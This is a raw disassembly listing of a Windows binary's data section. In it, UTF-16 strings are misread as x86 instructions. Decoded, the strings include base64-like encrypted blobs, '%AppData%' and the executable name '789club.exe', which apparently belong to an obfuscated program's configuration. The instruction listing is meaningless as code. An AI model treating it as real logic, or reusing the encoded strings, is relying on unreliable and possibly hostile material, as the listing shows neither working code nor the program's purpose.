  4096e4:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  4096e8:	4c                   	dec    %esp
  4096e9:	00 62 00             	add    %ah,0x0(%edx)
  4096ec:	6e                   	outsb  %ds:(%esi),(%dx)
  4096ed:	00 79 00             	add    %bh,0x0(%ecx)
  4096f0:	55                   	push   %ebp
  4096f1:	00 52 00             	add    %dl,0x0(%edx)
  4096f4:	62 00                	bound  %eax,(%eax)
  4096f6:	44                   	inc    %esp
  4096f7:	00 59 00             	add    %bl,0x0(%ecx)
  4096fa:	30 00                	xor    %al,(%eax)
  4096fc:	78 00                	js     0x4096fe
  4096fe:	57                   	push   %edi
  4096ff:	00 59 00             	add    %bl,0x0(%ecx)
  409702:	32 00                	xor    (%eax),%al
  409704:	4c                   	dec    %esp
  409705:	00 2f                	add    %ch,(%edi)
  409707:	00 43 00             	add    %al,0x0(%ebx)
  40970a:	39 00                	cmp    %eax,(%eax)
  40970c:	7a 00                	jp     0x40970e
  40970e:	68 00 59 00 48       	push   $0x48005900
  409713:	00 7a 00             	add    %bh,0x0(%edx)
  409716:	71 00                	jno    0x409718
  409718:	5a                   	pop    %edx
  409719:	00 35 00 6c 00 41    	add    %dh,0x41006c00
  40971f:	00 78 00             	add    %bh,0x0(%eax)
  409722:	31 00                	xor    %eax,(%eax)
  409724:	4f                   	dec    %edi
  409725:	00 2b                	add    %ch,(%ebx)
  409727:	00 68 00             	add    %ch,0x0(%eax)
  40972a:	6a 00                	push   $0x0
  40972c:	4b                   	dec    %ebx
  40972d:	00 6b 00             	add    %ch,0x0(%ebx)
  409730:	69 00 4f 00 2b 00    	imul   $0x2b004f,(%eax),%eax
  409736:	32 00                	xor    (%eax),%al
  409738:	43                   	inc    %ebx
  409739:	00 56 00             	add    %dl,0x0(%esi)
  40973c:	35 00 61 00 4a       	xor    $0x4a006100,%eax
  409741:	00 77 00             	add    %dh,0x0(%edi)
  409744:	68 00 57 00 75       	push   $0x75005700
  409749:	00 66 00             	add    %ah,0x0(%esi)
  40974c:	72 00                	jb     0x40974e
  40974e:	42                   	inc    %edx
  40974f:	00 70 00             	add    %dh,0x0(%eax)
  409752:	61                   	popa
  409753:	00 52 00             	add    %dl,0x0(%edx)
  409756:	56                   	push   %esi
  409757:	00 72 00             	add    %dh,0x0(%edx)
  40975a:	6b 00 69             	imul   $0x69,(%eax),%eax
  40975d:	00 59 00             	add    %bl,0x0(%ecx)
  409760:	79 00                	jns    0x409762
  409762:	48                   	dec    %eax
  409763:	00 45 00             	add    %al,0x0(%ebp)
  409766:	39 00                	cmp    %eax,(%eax)
  409768:	78 00                	js     0x40976a
  40976a:	65 00 41 00          	add    %al,%gs:0x0(%ecx)
  40976e:	4c                   	dec    %esp
  40976f:	00 63 00             	add    %ah,0x0(%ebx)
  409772:	64 00 62 00          	add    %ah,%fs:0x0(%edx)
  409776:	6a 00                	push   $0x0
  409778:	65 00 4b 00          	add    %cl,%gs:0x0(%ebx)
  40977c:	4f                   	dec    %edi
  40977d:	00 64 00 4f          	add    %ah,0x4f(%eax,%eax,1)
  409781:	00 64 00 55          	add    %ah,0x55(%eax,%eax,1)
  409785:	00 72 00             	add    %dh,0x0(%edx)
  409788:	37                   	aaa
  409789:	00 61 00             	add    %ah,0x0(%ecx)
  40978c:	64 00 4c 00 56       	add    %cl,%fs:0x56(%eax,%eax,1)
  409791:	00 6d 00             	add    %ch,0x0(%ebp)
  409794:	78 00                	js     0x409796
  409796:	73 00                	jae    0x409798
  409798:	79 00                	jns    0x40979a
  40979a:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40979e:	47                   	inc    %edi
  40979f:	00 69 00             	add    %ch,0x0(%ecx)
  4097a2:	33 00                	xor    (%eax),%eax
  4097a4:	4b                   	dec    %ebx
  4097a5:	00 4f 00             	add    %cl,0x0(%edi)
  4097a8:	47                   	inc    %edi
  4097a9:	00 39                	add    %bh,(%ecx)
  4097ab:	00 75 00             	add    %dh,0x0(%ebp)
  4097ae:	6c                   	insb   (%dx),%es:(%edi)
  4097af:	00 77 00             	add    %dh,0x0(%edi)
  4097b2:	38 00                	cmp    %al,(%eax)
  4097b4:	45                   	inc    %ebp
  4097b5:	00 47 00             	add    %al,0x0(%edi)
  4097b8:	43                   	inc    %ebx
  4097b9:	00 38                	add    %bh,(%eax)
  4097bb:	00 37                	add    %dh,(%edi)
  4097bd:	00 43 00             	add    %al,0x0(%ebx)
  4097c0:	44                   	inc    %esp
  4097c1:	00 6e 00             	add    %ch,0x0(%esi)
  4097c4:	57                   	push   %edi
  4097c5:	00 5a 00             	add    %bl,0x0(%edx)
  4097c8:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4097cc:	64 00 72 00          	add    %dh,%fs:0x0(%edx)
  4097d0:	6e                   	outsb  %ds:(%esi),(%dx)
  4097d1:	00 35 00 4e 00 72    	add    %dh,0x72004e00
  4097d7:	00 5a 00             	add    %bl,0x0(%edx)
  4097da:	66 00 76 00          	data16 add %dh,0x0(%esi)
  4097de:	39 00                	cmp    %eax,(%eax)
  4097e0:	69 00 4b 00 6c 00    	imul   $0x6c004b,(%eax),%eax
  4097e6:	49                   	dec    %ecx
  4097e7:	00 67 00             	add    %ah,0x0(%edi)
  4097ea:	43                   	inc    %ebx
  4097eb:	00 75 00             	add    %dh,0x0(%ebp)
  4097ee:	41                   	inc    %ecx
  4097ef:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  4097f5:	80 b1 46 00 6c 00 74 	xorb   $0x74,0x6c0046(%ecx)
  4097fc:	00 4f 00             	add    %cl,0x0(%edi)
  4097ff:	62 00                	bound  %eax,(%eax)
  409801:	39 00                	cmp    %eax,(%eax)
  409803:	55                   	push   %ebp
  409804:	00 65 00             	add    %ah,0x0(%ebp)
  409807:	39 00                	cmp    %eax,(%eax)
  409809:	66 00 36             	data16 add %dh,(%esi)
  40980c:	00 4c 00 44          	add    %cl,0x44(%eax,%eax,1)
  409810:	00 59 00             	add    %bl,0x0(%ecx)
  409813:	52                   	push   %edx
  409814:	00 43 00             	add    %al,0x0(%ebx)
  409817:	77 00                	ja     0x409819
  409819:	30 00                	xor    %al,(%eax)
  40981b:	6f                   	outsl  %ds:(%esi),(%dx)
  40981c:	00 69 00             	add    %ch,0x0(%ecx)
  40981f:	47                   	inc    %edi
  409820:	00 4c 00 58          	add    %cl,0x58(%eax,%eax,1)
  409824:	00 74 00 55          	add    %dh,0x55(%eax,%eax,1)
  409828:	00 39                	add    %bh,(%ecx)
  40982a:	00 50 00             	add    %dl,0x0(%eax)
  40982d:	42                   	inc    %edx
  40982e:	00 70 00             	add    %dh,0x0(%eax)
  409831:	73 00                	jae    0x409833
  409833:	6e                   	outsb  %ds:(%esi),(%dx)
  409834:	00 31                	add    %dh,(%ecx)
  409836:	00 34 00             	add    %dh,(%eax,%eax,1)
  409839:	4c                   	dec    %esp
  40983a:	00 7a 00             	add    %bh,0x0(%edx)
  40983d:	2b 00                	sub    (%eax),%eax
  40983f:	4a                   	dec    %edx
  409840:	00 46 00             	add    %al,0x0(%esi)
  409843:	6b 00 31             	imul   $0x31,(%eax),%eax
  409846:	00 38                	add    %bh,(%eax)
  409848:	00 78 00             	add    %bh,0x0(%eax)
  40984b:	43                   	inc    %ebx
  40984c:	00 62 00             	add    %ah,0x0(%edx)
  40984f:	72 00                	jb     0x409851
  409851:	52                   	push   %edx
  409852:	00 5a 00             	add    %bl,0x0(%edx)
  409855:	66 00 39             	data16 add %bh,(%ecx)
  409858:	00 76 00             	add    %dh,0x0(%esi)
  40985b:	35 00 49 00 45       	xor    $0x45004900,%eax
  409860:	00 77 00             	add    %dh,0x0(%edi)
  409863:	61                   	popa
  409864:	00 77 00             	add    %dh,0x0(%edi)
  409867:	64 00 49 00          	add    %cl,%fs:0x0(%ecx)
  40986b:	70 00                	jo     0x40986d
  40986d:	62 00                	bound  %eax,(%eax)
  40986f:	4b                   	dec    %ebx
  409870:	00 67 00             	add    %ah,0x0(%edi)
  409873:	73 00                	jae    0x409875
  409875:	65 00 43 00          	add    %al,%gs:0x0(%ebx)
  409879:	55                   	push   %ebp
  40987a:	00 47 00             	add    %al,0x0(%edi)
  40987d:	53                   	push   %ebx
  40987e:	00 6f 00             	add    %ch,0x0(%edi)
  409881:	59                   	pop    %ecx
  409882:	00 6c 00 4b          	add    %ch,0x4b(%eax,%eax,1)
  409886:	00 5a 00             	add    %bl,0x0(%edx)
  409889:	2b 00                	sub    (%eax),%eax
  40988b:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  40988f:	57                   	push   %edi
  409890:	00 54 00 6f          	add    %dl,0x6f(%eax,%eax,1)
  409894:	00 4a 00             	add    %cl,0x0(%edx)
  409897:	31 00                	xor    %eax,(%eax)
  409899:	68 00 4f 00 77       	push   $0x77004f00
  40989e:	00 45 00             	add    %al,0x0(%ebp)
  4098a1:	67 00 3d             	add    %bh,(%di)
  4098a4:	00 3d 00 00 80 b1    	add    %bh,0xb1800000
  4098aa:	36 00 31             	add    %dh,%ss:(%ecx)
  4098ad:	00 2b                	add    %ch,(%ebx)
  4098af:	00 63 00             	add    %ah,0x0(%ebx)
  4098b2:	4f                   	dec    %edi
  4098b3:	00 38                	add    %bh,(%eax)
  4098b5:	00 49 00             	add    %cl,0x0(%ecx)
  4098b8:	4f                   	dec    %edi
  4098b9:	00 69 00             	add    %ch,0x0(%ecx)
  4098bc:	4c                   	dec    %esp
  4098bd:	00 61 00             	add    %ah,0x0(%ecx)
  4098c0:	6c                   	insb   (%dx),%es:(%edi)
  4098c1:	00 54 00 42          	add    %dl,0x42(%eax,%eax,1)
  4098c5:	00 64 00 53          	add    %ah,0x53(%eax,%eax,1)
  4098c9:	00 71 00             	add    %dh,0x0(%ecx)
  4098cc:	43                   	inc    %ebx
  4098cd:	00 4a 00             	add    %cl,0x0(%edx)
  4098d0:	58                   	pop    %eax
  4098d1:	00 59 00             	add    %bl,0x0(%ecx)
  4098d4:	33 00                	xor    (%eax),%eax
  4098d6:	69 00 39 00 49 00    	imul   $0x490039,(%eax),%eax
  4098dc:	37                   	aaa
  4098dd:	00 66 00             	add    %ah,0x0(%esi)
  4098e0:	45                   	inc    %ebp
  4098e1:	00 6f 00             	add    %ch,0x0(%edi)
  4098e4:	61                   	popa
  4098e5:	00 4a 00             	add    %cl,0x0(%edx)
  4098e8:	42                   	inc    %edx
  4098e9:	00 2b                	add    %ch,(%ebx)
  4098eb:	00 4b 00             	add    %cl,0x0(%ebx)
  4098ee:	50                   	push   %eax
  4098ef:	00 34 00             	add    %dh,(%eax,%eax,1)
  4098f2:	2b 00                	sub    (%eax),%eax
  4098f4:	79 00                	jns    0x4098f6
  4098f6:	61                   	popa
  4098f7:	00 5a 00             	add    %bl,0x0(%edx)
  4098fa:	7a 00                	jp     0x4098fc
  4098fc:	4b                   	dec    %ebx
  4098fd:	00 5a 00             	add    %bl,0x0(%edx)
  409900:	63 00                	arpl   %eax,(%eax)
  409902:	32 00                	xor    (%eax),%al
  409904:	53                   	push   %ebx
  409905:	00 78 00             	add    %bh,0x0(%eax)
  409908:	61                   	popa
  409909:	00 45 00             	add    %al,0x0(%ebp)
  40990c:	32 00                	xor    (%eax),%al
  40990e:	71 00                	jno    0x409910
  409910:	6a 00                	push   $0x0
  409912:	76 00                	jbe    0x409914
  409914:	76 00                	jbe    0x409916
  409916:	6e                   	outsb  %ds:(%esi),(%dx)
  409917:	00 67 00             	add    %ah,0x0(%edi)
  40991a:	68 00 30 00 46       	push   $0x46003000
  40991f:	00 66 00             	add    %ah,0x0(%esi)
  409922:	6b 00 6f             	imul   $0x6f,(%eax),%eax
  409925:	00 78 00             	add    %bh,0x0(%eax)
  409928:	38 00                	cmp    %al,(%eax)
  40992a:	55                   	push   %ebp
  40992b:	00 52 00             	add    %dl,0x0(%edx)
  40992e:	39 00                	cmp    %eax,(%eax)
  409930:	32 00                	xor    (%eax),%al
  409932:	55                   	push   %ebp
  409933:	00 6d 00             	add    %ch,0x0(%ebp)
  409936:	70 00                	jo     0x409938
  409938:	2f                   	das
  409939:	00 48 00             	add    %cl,0x0(%eax)
  40993c:	2f                   	das
  40993d:	00 50 00             	add    %dl,0x0(%eax)
  409940:	58                   	pop    %eax
  409941:	00 47 00             	add    %al,0x0(%edi)
  409944:	69 00 78 00 4f 00    	imul   $0x4f0078,(%eax),%eax
  40994a:	54                   	push   %esp
  40994b:	00 77 00             	add    %dh,0x0(%edi)
  40994e:	42                   	inc    %edx
  40994f:	00 44 00 30          	add    %al,0x30(%eax,%eax,1)
  409953:	00 51 00             	add    %dl,0x0(%ecx)
  409956:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40995b:	13 25 00 41 00 70    	adc    0x70004100,%esp
  409961:	00 70 00             	add    %dh,0x0(%eax)
  409964:	44                   	inc    %esp
  409965:	00 61 00             	add    %ah,0x0(%ecx)
  409968:	74 00                	je     0x40996a
  40996a:	61                   	popa
  40996b:	00 25 00 00 17 37    	add    %ah,0x37170000
  409971:	00 38                	add    %bh,(%eax)
  409973:	00 39                	add    %bh,(%ecx)
  409975:	00 63 00             	add    %ah,0x0(%ebx)
  409978:	6c                   	insb   (%dx),%es:(%edi)
  409979:	00 75 00             	add    %dh,0x0(%ebp)
  40997c:	62 00                	bound  %eax,(%eax)
  40997e:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  409982:	78 00                	js     0x409984
  409984:	65 00 00             	add    %al,%gs:(%eax)
  409987:	59                   	pop    %ecx
  409988:	65 00 6a 00          	add    %ch,%gs:0x0(%edx)
  40998c:	4a                   	dec    %edx
  40998d:	00 45 00             	add    %al,0x0(%ebp)
  409990:	52                   	push   %edx
  409991:	00 30                	add    %dh,(%eax)
  409993:	00 68 00             	add    %ch,0x0(%eax)
  409996:	6e                   	outsb  %ds:(%esi),(%dx)
  409997:	00 54 00 54          	add    %dl,0x54(%eax,%eax,1)
  40999b:	00 56 00             	add    %dl,0x0(%esi)
  40999e:	72 00                	jb     0x4099a0
  4099a0:	57                   	push   %edi
  4099a1:	00 47 00             	add    %al,0x0(%edi)
  4099a4:	70 00                	jo     0x4099a6
  4099a6:	6c                   	insb   (%dx),%es:(%edi)
  4099a7:	00 62 00             	add    %ah,0x0(%edx)
  4099aa:	55                   	push   %ebp
  4099ab:	00 46 00             	add    %al,0x0(%esi)
  4099ae:	46                   	inc    %esi
  4099af:	00 4d 00             	add    %cl,0x0(%ebp)
  4099b2:	56                   	push   %esi
  4099b3:	00 46 00             	add    %al,0x0(%esi)
  4099b6:	5a                   	pop    %edx
  4099b7:	00 64 00 48          	add    %ah,0x48(%eax,%eax,1)
  4099bb:	00 42 00             	add    %al,0x0(%edx)
  4099be:	33 00                	xor    (%eax),%eax
  4099c0:	51                   	push   %ecx
  4099c1:	00 31                	add    %dh,(%ecx)
  4099c3:	00 6b 00             	add    %ch,0x0(%ebx)
  4099c6:	7a 00                	jp     0x4099c8
  4099c8:	59                   	pop    %ecx
  4099c9:	00 6d 00             	add    %ch,0x0(%ebp)
  4099cc:	56                   	push   %esi
  4099cd:	00 59 00             	add    %bl,0x0(%ecx)
  4099d0:	55                   	push   %ebp
  4099d1:	00 48 00             	add    %cl,0x0(%eax)
  4099d4:	56                   	push   %esi
  4099d5:	00 55 00             	add    %dl,0x0(%ebp)
  4099d8:	54                   	push   %esp
  4099d9:	00 30                	add    %dh,(%eax)
  4099db:	00 77 00             	add    %dh,0x0(%edi)
  4099de:	3d 00 00 80 b1       	cmp    $0xb1800000,%eax
  4099e3:	45                   	inc    %ebp
  4099e4:	00 58 00             	add    %bl,0x0(%eax)
  4099e7:	65 00 68 00          	add    %ch,%gs:0x0(%eax)
  4099eb:	43                   	inc    %ebx
  4099ec:	00 2b                	add    %ch,(%ebx)
  4099ee:	00 2f                	add    %ch,(%edi)
  4099f0:	00 35 00 57 00 50    	add    %dh,0x50005700
  4099f6:	00 6e 00             	add    %ch,0x0(%esi)
  4099f9:	66 00 31             	data16 add %dh,(%ecx)
  4099fc:	00 77 00             	add    %dh,0x0(%edi)
  4099ff:	54                   	push   %esp
  409a00:	00 62 00             	add    %ah,0x0(%edx)
  409a03:	73 00                	jae    0x409a05
  409a05:	38 00                	cmp    %al,(%eax)
  409a07:	37                   	aaa
  409a08:	00 72 00             	add    %dh,0x0(%edx)
  409a0b:	46                   	inc    %esi
  409a0c:	00 72 00             	add    %dh,0x0(%edx)
  409a0f:	47                   	inc    %edi
  409a10:	00 36                	add    %dh,(%esi)
  409a12:	00 62 00             	add    %ah,0x0(%edx)
  409a15:	70 00                	jo     0x409a17
  409a17:	38 00                	cmp    %al,(%eax)
  409a19:	6f                   	outsl  %ds:(%esi),(%dx)
  409a1a:	00 64 00 52          	add    %ah,0x52(%eax,%eax,1)
  409a1e:	00 66 00             	add    %ah,0x0(%esi)
  409a21:	42                   	inc    %edx
  409a22:	00 4d 00             	add    %cl,0x0(%ebp)
  409a25:	34 00                	xor    $0x0,%al
  409a27:	4e                   	dec    %esi
  409a28:	00 2b                	add    %ch,(%ebx)
  409a2a:	00 61 00             	add    %ah,0x0(%ecx)
  409a2d:	6d                   	insl   (%dx),%es:(%edi)
  409a2e:	00 58 00             	add    %bl,0x0(%eax)
  409a31:	32 00                	xor    (%eax),%al
  409a33:	33 00                	xor    (%eax),%eax
  409a35:	6c                   	insb   (%dx),%es:(%edi)
  409a36:	00 2b                	add    %ch,(%ebx)
  409a38:	00 4d 00             	add    %cl,0x0(%ebp)
  409a3b:	52                   	push   %edx
  409a3c:	00 59 00             	add    %bl,0x0(%ecx)
  409a3f:	44                   	inc    %esp
  409a40:	00 44 00 4d          	add    %al,0x4d(%eax,%eax,1)
  409a44:	00 41 00             	add    %al,0x0(%ecx)
  409a47:	69 00 6e 00 33 00    	imul   $0x33006e,(%eax),%eax
  409a4d:	47                   	inc    %edi
  409a4e:	00 46 00             	add    %al,0x0(%esi)
  409a51:	4a                   	dec    %edx
  409a52:	00 44 00 4a          	add    %al,0x4a(%eax,%eax,1)
  409a56:	00 47 00             	add    %al,0x0(%edi)
  409a59:	76 00                	jbe    0x409a5b
  409a5b:	38 00                	cmp    %al,(%eax)
  409a5d:	2f                   	das
  409a5e:	00 79 00             	add    %bh,0x0(%ecx)
  409a61:	4b                   	dec    %ebx
  409a62:	00 42 00             	add    %al,0x0(%edx)
  409a65:	2b 00                	sub    (%eax),%eax
  409a67:	61                   	popa
  409a68:	00 56 00             	add    %dl,0x0(%esi)
  409a6b:	45                   	inc    %ebp
  409a6c:	00 56 00             	add    %dl,0x0(%esi)
  409a6f:	41                   	inc    %ecx
  409a70:	00 78 00             	add    %bh,0x0(%eax)
  409a73:	4a                   	dec    %edx
  409a74:	00 53 00             	add    %dl,0x0(%ebx)
  409a77:	32 00                	xor    (%eax),%al
  409a79:	6a 00                	push   $0x0
  409a7b:	38 00                	cmp    %al,(%eax)
  409a7d:	75 00                	jne    0x409a7f
  409a7f:	6b 00 7a             	imul   $0x7a,(%eax),%eax
  409a82:	00 2b                	add    %ch,(%ebx)
  409a84:	00 5a 00             	add    %bl,0x0(%edx)
  409a87:	6e                   	outsb  %ds:(%esi),(%dx)
  409a88:	00 45 00             	add    %al,0x0(%ebp)
  409a8b:	4e                   	dec    %esi
  409a8c:	00 67 00             	add    %ah,0x0(%edi)
  409a8f:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  409a94:	92                   	xchg   %eax,%edx
  409a95:	01 76 00             	add    %esi,0x0(%esi)
  409a98:	70 00                	jo     0x409a9a
  409a9a:	59                   	pop    %ecx
  409a9b:	00 5a 00             	add    %bl,0x0(%edx)
  409a9e:	79 00                	jns    0x409aa0
  409aa0:	6f                   	outsl  %ds:(%esi),(%dx)
  409aa1:	00 51 00             	add    %dl,0x0(%ecx)
  409aa4:	6c                   	insb   (%dx),%es:(%edi)
  409aa5:	00 69 00             	add    %ch,0x0(%ecx)
  409aa8:	55                   	push   %ebp
  409aa9:	00 46 00             	add    %al,0x0(%esi)
  409aac:	2b 00                	sub    (%eax),%eax
  409aae:	4a                   	dec    %edx
  409aaf:	00 66 00             	add    %ah,0x0(%esi)
  409ab2:	52                   	push   %edx
  409ab3:	00 52 00             	add    %dl,0x0(%edx)
  409ab6:	69 00 38 00 6e 00    	imul   $0x6e0038,(%eax),%eax
  409abc:	4e                   	dec    %esi
  409abd:	00 6c 00 37          	add    %ch,0x37(%eax,%eax,1)
  409ac1:	00 52 00             	add    %dl,0x0(%edx)
  409ac4:	66 00 67 00          	data16 add %ah,0x0(%edi)
  409ac8:	78 00                	js     0x409aca
  409aca:	58                   	pop    %eax
  409acb:	00 44 00 2b          	add    %al,0x2b(%eax,%eax,1)
  409acf:	00 53 00             	add    %dl,0x0(%ebx)
  409ad2:	38 00                	cmp    %al,(%eax)
  409ad4:	4a                   	dec    %edx
  409ad5:	00 55 00             	add    %dl,0x0(%ebp)
  409ad8:	6d                   	insl   (%dx),%es:(%edi)
  409ad9:	00 51 00             	add    %dl,0x0(%ecx)
  409adc:	42                   	inc    %edx
  409add:	00 4e 00             	add    %cl,0x0(%esi)
  409ae0:	37                   	aaa
  409ae1:	00 4b 00             	add    %cl,0x0(%ebx)
  409ae4:	52                   	push   %edx
  409ae5:	00 5a 00             	add    %bl,0x0(%edx)
  409ae8:	31 00                	xor    %eax,(%eax)
  409aea:	6e                   	outsb  %ds:(%esi),(%dx)
  409aeb:	00 57 00             	add    %dl,0x0(%edi)
  409aee:	6e                   	outsb  %ds:(%esi),(%dx)
  409aef:	00 39                	add    %bh,(%ecx)
  409af1:	00 4e 00             	add    %cl,0x0(%esi)
  409af4:	57                   	push   %edi
  409af5:	00 31                	add    %dh,(%ecx)
  409af7:	00 55 00             	add    %dl,0x0(%ebp)
  409afa:	79 00                	jns    0x409afc
  409afc:	4f                   	dec    %edi
  409afd:	00 4d 00             	add    %cl,0x0(%ebp)
  409b00:	30 00                	xor    %al,(%eax)
  409b02:	43                   	inc    %ebx
  409b03:	00 62 00             	add    %ah,0x0(%edx)
  409b06:	52                   	push   %edx
  409b07:	00 50 00             	add    %dl,0x0(%eax)
  409b0a:	39 00                	cmp    %eax,(%eax)
  409b0c:	50                   	push   %eax
  409b0d:	00 38                	add    %bh,(%eax)
  409b0f:	00 53 00             	add    %dl,0x0(%ebx)
  409b12:	35 00 6e 00 35       	xor    $0x35006e00,%eax
  409b17:	00 37                	add    %dh,(%edi)
  409b19:	00 36                	add    %dh,(%esi)
  409b1b:	00 47 00             	add    %al,0x0(%edi)
  409b1e:	65 00 7a 00          	add    %bh,%gs:0x0(%edx)
  409b22:	56                   	push   %esi
  409b23:	00 6a 00             	add    %ch,0x0(%edx)
  409b26:	4b                   	dec    %ebx
  409b27:	00 2b                	add    %ch,(%ebx)
  409b29:	00 64 00 39          	add    %ah,0x39(%eax,%eax,1)
  409b2d:	00 67 00             	add    %ah,0x0(%edi)
  409b30:	6c                   	insb   (%dx),%es:(%edi)
  409b31:	00 58 00             	add    %bl,0x0(%eax)
  409b34:	48                   	dec    %eax
  409b35:	00 66 00             	add    %ah,0x0(%esi)
  409b38:	49                   	dec    %ecx
  409b39:	00 48 00             	add    %cl,0x0(%eax)
  409b3c:	33 00                	xor    (%eax),%eax
  409b3e:	58                   	pop    %eax
  409b3f:	00 42 00             	add    %al,0x0(%edx)
  409b42:	65 00 51 00          	add    %dl,%gs:0x0(%ecx)
  409b46:	6f                   	outsl  %ds:(%esi),(%dx)
  409b47:	00 52 00             	add    %dl,0x0(%edx)
  409b4a:	58                   	pop    %eax
  409b4b:	00 49 00             	add    %cl,0x0(%ecx)
  409b4e:	77 00                	ja     0x409b50
  409b50:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  409b54:	31 00                	xor    %eax,(%eax)
  409b56:	6c                   	insb   (%dx),%es:(%edi)
  409b57:	00 71 00             	add    %dh,0x0(%ecx)
  409b5a:	78 00                	js     0x409b5c
  409b5c:	52                   	push   %edx
  409b5d:	00 49 00             	add    %cl,0x0(%ecx)
  409b60:	65 00 71 00          	add    %dh,%gs:0x0(%ecx)
  409b64:	71 00                	jno    0x409b66
  409b66:	2f                   	das
  409b67:	00 6b 00             	add    %ch,0x0(%ebx)
  409b6a:	70 00                	jo     0x409b6c
  409b6c:	6c                   	insb   (%dx),%es:(%edi)
  409b6d:	00 4f 00             	add    %cl,0x0(%edi)
  409b70:	64 00 34 00          	add    %dh,%fs:(%eax,%eax,1)
  409b74:	77 00                	ja     0x409b76
  409b76:	67 00 74 00          	add    %dh,0x0(%si)
  409b7a:	4f                   	dec    %edi
  409b7b:	00 72 00             	add    %dh,0x0(%edx)
  409b7e:	6b 00 76             	imul   $0x76,(%eax),%eax
  409b81:	00 30                	add    %dh,(%eax)
  409b83:	00 6b 00             	add    %ch,0x0(%ebx)
  409b86:	58                   	pop    %eax
  409b87:	00 67 00             	add    %ah,0x0(%edi)
  409b8a:	44                   	inc    %esp
  409b8b:	00 62 00             	add    %ah,0x0(%edx)
  409b8e:	50                   	push   %eax
  409b8f:	00 4f 00             	add    %cl,0x0(%edi)
  409b92:	38 00                	cmp    %al,(%eax)
  409b94:	6b 00 4a             	imul   $0x4a,(%eax),%eax
  409b97:	00 54 00 49          	add    %dl,0x49(%eax,%eax,1)
  409b9b:	00 59 00             	add    %bl,0x0(%ecx)
  409b9e:	78 00                	js     0x409ba0
  409ba0:	61                   	popa
  409ba1:	00 62 00             	add    %ah,0x0(%edx)
  409ba4:	4b                   	dec    %ebx
  409ba5:	00 65 00             	add    %ah,0x0(%ebp)
  409ba8:	45                   	inc    %ebp
  409ba9:	00 49 00             	add    %cl,0x0(%ecx)
  409bac:	6c                   	insb   (%dx),%es:(%edi)
  409bad:	00 6a 00             	add    %ch,0x0(%edx)
  409bb0:	71 00                	jno    0x409bb2
  409bb2:	6c                   	insb   (%dx),%es:(%edi)
  409bb3:	00 53 00             	add    %dl,0x0(%ebx)
  409bb6:	53                   	push   %ebx
  409bb7:	00 56 00             	add    %dl,0x0(%esi)
  409bba:	46                   	inc    %esi
  409bbb:	00 63 00             	add    %ah,0x0(%ebx)
  409bbe:	4e                   	dec    %esi
  409bbf:	00 55 00             	add    %dl,0x0(%ebp)
  409bc2:	66 00 71 00          	data16 add %dh,0x0(%ecx)
  409bc6:	6a 00                	push   $0x0
  409bc8:	66 00 62 00          	data16 add %ah,0x0(%edx)
  409bcc:	34 00                	xor    $0x0,%al
  409bce:	47                   	inc    %edi
  409bcf:	00 4d 00             	add    %cl,0x0(%ebp)
  409bd2:	72 00                	jb     0x409bd4
  409bd4:	63 00                	arpl   %eax,(%eax)
  409bd6:	6a 00                	push   $0x0
  409bd8:	46                   	inc    %esi
  409bd9:	00 73 00             	add    %dh,0x0(%ebx)
  409bdc:	2f                   	das
  409bdd:	00 37                	add    %dh,(%edi)
  409bdf:	00 74 00 64          	add    %dh,0x64(%eax,%eax,1)
  409be3:	00 75 00             	add    %dh,0x0(%ebp)
  409be6:	77 00                	ja     0x409be8
  409be8:	70 00                	jo     0x409bea
  409bea:	64 00 66 00          	add    %ah,%fs:0x0(%esi)
  409bee:	46                   	inc    %esi
  409bef:	00 41 00             	add    %al,0x0(%ecx)
  409bf2:	51                   	push   %ecx
  409bf3:	00 6b 00             	add    %ch,0x0(%ebx)
  409bf6:	57                   	push   %edi
  409bf7:	00 53 00             	add    %dl,0x0(%ebx)
  409bfa:	6d                   	insl   (%dx),%es:(%edi)
  409bfb:	00 78 00             	add    %bh,0x0(%eax)
  409bfe:	58                   	pop    %eax
  409bff:	00 4a 00             	add    %cl,0x0(%edx)
  409c02:	70 00                	jo     0x409c04
  409c04:	54                   	push   %esp
  409c05:	00 45 00             	add    %al,0x0(%ebp)
  409c08:	32 00                	xor    (%eax),%al
  409c0a:	6a 00                	push   $0x0
  409c0c:	69 00 34 00 6b 00    	imul   $0x6b0034,(%eax),%eax
  409c12:	50                   	push   %eax
  409c13:	00 52 00             	add    %dl,0x0(%edx)
  409c16:	46                   	inc    %esi
  409c17:	00 72 00             	add    %dh,0x0(%edx)
  409c1a:	43                   	inc    %ebx
  409c1b:	00 62 00             	add    %ah,0x0(%edx)
  409c1e:	55                   	push   %ebp
  409c1f:	00 6d 00             	add    %ch,0x0(%ebp)
  409c22:	64 00 59 00          	add    %bl,%fs:0x0(%ecx)
  409c26:	6a 00                	push   $0x0
  409c28:	51                   	push   %ecx
  409c29:	00 66 00             	add    %ah,0x0(%esi)
  409c2c:	44                   	inc    %esp
  409c2d:	00 32                	add    %dh,(%edx)
  409c2f:	00 2b                	add    %ch,(%ebx)
  409c31:	00 6a 00             	add    %ch,0x0(%edx)
  409c34:	63 00                	arpl   %eax,(%eax)
  409c36:	4d                   	dec    %ebp
  409c37:	00 64 00 42          	add    %ah,0x42(%eax,%eax,1)
  409c3b:	00 4b 00             	add    %cl,0x0(%ebx)
  409c3e:	50                   	push   %eax
  409c3f:	00 61 00             	add    %ah,0x0(%ecx)
  409c42:	6b 00 53             	imul   $0x53,(%eax),%eax
  409c45:	00 2f                	add    %ch,(%edi)
  409c47:	00 2b                	add    %ch,(%ebx)
  409c49:	00 2f                	add    %ch,(%edi)
  409c4b:	00 37                	add    %dh,(%edi)
  409c4d:	00 6a 00             	add    %ch,0x0(%edx)
  409c50:	41                   	inc    %ecx
  409c51:	00 66 00             	add    %ah,0x0(%esi)
  409c54:	32 00                	xor    (%eax),%al
  409c56:	4c                   	dec    %esp
  409c57:	00 56 00             	add    %dl,0x0(%esi)
  409c5a:	58                   	pop    %eax
  409c5b:	00 76 00             	add    %dh,0x0(%esi)
  409c5e:	77 00                	ja     0x409c60
  409c60:	74 00                	je     0x409c62
  409c62:	56                   	push   %esi
  409c63:	00 5a 00             	add    %bl,0x0(%edx)
